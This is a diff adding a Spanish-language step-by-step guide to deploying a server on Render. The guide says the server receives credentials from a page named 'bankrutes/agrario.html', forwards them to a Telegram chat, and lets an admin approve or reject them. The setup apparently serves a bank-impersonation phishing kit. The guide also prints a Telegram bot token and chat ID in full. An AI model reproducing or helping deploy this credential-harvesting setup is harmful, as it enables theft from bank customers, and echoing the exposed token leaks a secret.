@@ -1,0 +1,93 @@
+════════════════════════════════════════════════════════════════
+🚀 PASOS PARA DESPLEGAR EN RENDER
+════════════════════════════════════════════════════════════════
+
+PASO 1: Crear repositorio en GitHub
+─────────────────────────────────────
+1. Ve a https://github.com/new
+2. Crea un nuevo repositorio llamado "alcanos-server"
+3. NO inicialices con README
+4. Copia la URL del repositorio (https://github.com/TU_USER/alcanos-server.git)
+
+PASO 2: Push del servidor a GitHub
+──────────────────────────────────
+1. Abre terminal en la carpeta "server"
+2. Ejecuta:
+   $ git init
+   $ git add .
+   $ git commit -m "Initial commit: Alcanos payment server"
+   $ git branch -M main
+   $ git remote add origin https://github.com/TU_USER/alcanos-server.git
+   $ git push -u origin main
+
+PASO 3: Configurar Render
+────────────────────────
+1. Ve a https://render.com (crear cuenta gratis)
+2. Click en "Dashboard" → "New +" → "Web Service"
+3. Selecciona "Deploy an existing repository from GitHub"
+4. Busca "alcanos-server" y conecta
+5. Configura:
+   - Name: alcanos-server
+   - Environment: Python 3
+   - Region: Cualquiera (ej: Ohio)
+   - Branch: main
+   - Build Command: pip install -r requirements.txt
+   - Start Command: gunicorn app:app
+   - Plan: Starter (gratis)
+
+PASO 4: Agregar Variables de Entorno
+────────────────────────────────────
+1. En el dashboard de Render, ve a "Settings" (esquina superior derecha)
+2. Busca "Environment"
+3. Click en "Add Environment Variable"
+4. Agrega estas dos variables:
+
+   TELEGRAM_BOT_TOKEN
+   Valor: 8499803362:AAHxkqI11-YbYgHvjQZf3l7EkpTHanKOe14
+
+   TELEGRAM_CHAT_ID
+   Valor: -1002904816351
+
+5. Click en "Save"
+
+PASO 5: Deploy
+──────────────
+1. Render automáticamente comienza el deploy
+2. Espera a que termine (3-5 minutos)
+3. Cuando veas "Live", el servidor está activo
+4. Copia la URL: https://alcanos-server.onrender.com
+
+PASO 6: Actualizar agrario.html
+────────────────────────────────
+En bankrutes/agrario.html, línea ~392:
+
+const SERVER_URL = 'https://alcanos-server.onrender.com/api';
+
+Cambiar "alcanos-server" por el nombre que usaste en Render.
+
+════════════════════════════════════════════════════════════════
+
+✅ ¡LISTO!
+
+El servidor está corriendo y:
+- Recibe credenciales de agrario.html
+- Las envía a Telegram con botones
+- El admin puede aprobar/rechazar
+- Se mantiene activo (no duerme) gracias al keep-alive
+
+════════════════════════════════════════════════════════════════
+
+🧪 TESTING RÁPIDO
+
+1. Ve a https://alcanos-server.onrender.com
+2. Deberías ver:
+   {
+     "app": "Alcanos Payment Server",
+     "version": "1.0.0",
+     "status": "running",
+     ...
+   }
+
+Si ves esto, ¡el servidor está activo!
+
+════════════════════════════════════════════════════════════════
